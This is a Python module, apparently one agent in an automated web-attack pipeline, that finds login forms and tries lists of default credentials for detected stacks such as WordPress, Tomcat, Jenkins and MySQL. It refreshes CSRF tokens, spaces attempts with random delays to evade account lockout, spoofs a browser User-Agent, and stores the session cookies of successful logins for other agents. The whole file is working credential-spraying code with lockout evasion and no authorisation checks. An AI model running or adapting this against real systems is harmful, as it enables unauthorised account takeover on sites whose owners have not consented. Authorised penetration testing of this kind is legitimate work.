"""Authentication Agent — credential testing + session management.

Fragmented credential testing with delays to avoid lockout.
Technology-aware: tries credentials specific to detected stack.
"""
from __future__ import annotations

import random
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

import requests

from agents_graph.state import AgentState

# Technology-specific default credentials
_TECH_CREDS = {
    "wordpress":  [("admin","admin"),("admin","password"),("admin","wordpress"),("admin","123456")],
    "drupal":     [("admin","admin"),("admin","drupal")],
    "joomla":     [("admin","admin"),("administrator","admin")],
    "tomcat":     [("admin","admin"),("tomcat","tomcat"),("manager","manager"),("admin","s3cret")],
    "jenkins":    [("admin","admin"),("jenkins","jenkins"),("admin","password")],
    "phpmyadmin": [("root",""),("root","root"),("admin","admin")],
    "grafana":    [("admin","admin"),("admin","grafana")],
    "kibana":     [("elastic","changeme"),("admin","admin")],
    "mongo":      [("admin","admin"),("root","root")],
    "mysql":      [("root",""),("root","root"),("admin","admin")],
    "postgres":   [("postgres","postgres"),("admin","admin")],
    "redis":      [("",""),("redis","redis")],
    "nginx":      [("admin","admin")],
    "apache":     [("admin","admin")],
    "iis":        [("administrator",""),("admin","admin")],
    "default":    [
        ("admin","admin"),("admin","password"),("admin","1234"),
        ("admin","123456"),("root","root"),("root",""),
        ("administrator","administrator"),("test","test"),
        ("guest","guest"),("user","user"),("admin","admin123"),
    ],
}

_LOGIN_INDICATORS = ["dashboard","logout","welcome","profile","account",
                      "sign out","log out","my account","home"]
_FAILURE_INDICATORS = ["invalid","incorrect","failed","wrong","error",
                        "denied","unauthorized","bad credentials"]


def _detect_login_form(url: str, session: requests.Session) -> Optional[Dict[str, Any]]:
    """Detect login form fields on a page."""
    import re
    try:
        resp = session.get(url, timeout=8, allow_redirects=True)
        # Look for password fields
        pwd_fields = re.findall(r'<input[^>]+type=["\']password["\'][^>]*>', resp.text, re.I)
        if not pwd_fields:
            return None
        # Find field names
        user_field = None
        pwd_field = None
        for field in re.findall(r'<input[^>]+>', resp.text, re.I):
            if 'type="password"' in field.lower() or "type='password'" in field.lower():
                m = re.search(r'name=["\']([^"\']+)', field, re.I)
                if m:
                    pwd_field = m.group(1)
            elif any(kw in field.lower() for kw in ['user','email','login','name']):
                m = re.search(r'name=["\']([^"\']+)', field, re.I)
                if m:
                    user_field = m.group(1)
        # Find form action
        action_m = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', resp.text, re.I)
        action = action_m.group(1) if action_m else url
        csrf_m = re.search(r'name=["\'](_token|csrf[^"\']*|nonce)["\'][^>]*value=["\']([^"\']+)', resp.text, re.I)
        csrf = {"field": csrf_m.group(1), "value": csrf_m.group(2)} if csrf_m else None
        return {
            "login_url": url,
            "action": urljoin(url, action) if action else url,
            "user_field": user_field or "username",
            "pwd_field": pwd_field or "password",
            "csrf": csrf,
        }
    except Exception:
        return None


def _try_login(form: Dict[str, Any], username: str, password: str,
               session: requests.Session) -> bool:
    """Attempt a login. Returns True if login appears successful."""
    data = {
        form["user_field"]: username,
        form["pwd_field"]: password,
    }
    if form.get("csrf"):
        data[form["csrf"]["field"]] = form["csrf"]["value"]
    try:
        resp = session.post(form["action"], data=data, timeout=8, allow_redirects=True)
        body_lower = resp.text.lower()
        # Check for success indicators
        if any(ind in body_lower for ind in _LOGIN_INDICATORS):
            # Make sure it's not also showing failure
            if not any(ind in body_lower for ind in _FAILURE_INDICATORS):
                return True
        # Check redirect to non-login page as success signal
        if resp.url and "login" not in resp.url.lower() and resp.status_code == 200:
            if "logout" in resp.text.lower() or "dashboard" in resp.text.lower():
                return True
    except Exception:
        pass
    return False


def _get_creds_for_tech(technologies: List[Dict]) -> List[tuple]:
    """Get credential list based on detected technologies."""
    creds = []
    for tech in technologies:
        name = tech.get("name", "").lower()
        for key, c_list in _TECH_CREDS.items():
            if key in name:
                creds.extend(c_list)
    # Always add generic defaults
    creds.extend(_TECH_CREDS["default"])
    # Deduplicate while preserving order
    seen = set()
    unique = []
    for c in creds:
        if c not in seen:
            seen.add(c)
            unique.append(c)
    return unique


def run_auth(state: AgentState) -> AgentState:
    url = state.get("target_url", "")
    endpoints = state.get("endpoints", [])
    technologies = state.get("technologies", [])
    errors = list(state.get("errors", []))
    state = {**state, "current_agent": "auth"}

    default_creds_found = []
    sessions = {}

    # Find login pages
    login_candidates = [url]
    for ep in endpoints:
        ep_lower = ep.lower()
        if any(kw in ep_lower for kw in ["login","signin","auth","admin","wp-login","user"]):
            login_candidates.append(ep)

    creds_to_try = _get_creds_for_tech(technologies)

    for login_url in login_candidates[:5]:  # test up to 5 login pages
        session = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        form = _detect_login_form(login_url, session)
        if not form:
            continue

        for username, password in creds_to_try:
            # Fragmented: random delay 0.8–2.5s between attempts to avoid lockout
            time.sleep(random.uniform(0.8, 2.5))

            # Refresh CSRF token before each attempt
            if form.get("csrf"):
                try:
                    import re
                    r = session.get(form["login_url"], timeout=6)
                    m = re.search(
                        rf'name=["\']({form["csrf"]["field"]})["\'][^>]*value=["\']([^"\']+)',
                        r.text, re.I
                    )
                    if m:
                        form["csrf"]["value"] = m.group(2)
                except Exception:
                    pass

            success = _try_login(form, username, password, session)
            if success:
                default_creds_found.append({
                    "url": login_url,
                    "username": username,
                    "password": password,
                    "form_action": form["action"],
                })
                # Save session cookies for other agents
                sessions[f"{username}@{urlparse(login_url).hostname}"] = dict(session.cookies)
                break  # move to next login page after finding valid creds

    return {
        **state,
        "default_creds_found": default_creds_found,
        "sessions": sessions,
        "errors": errors,
    }
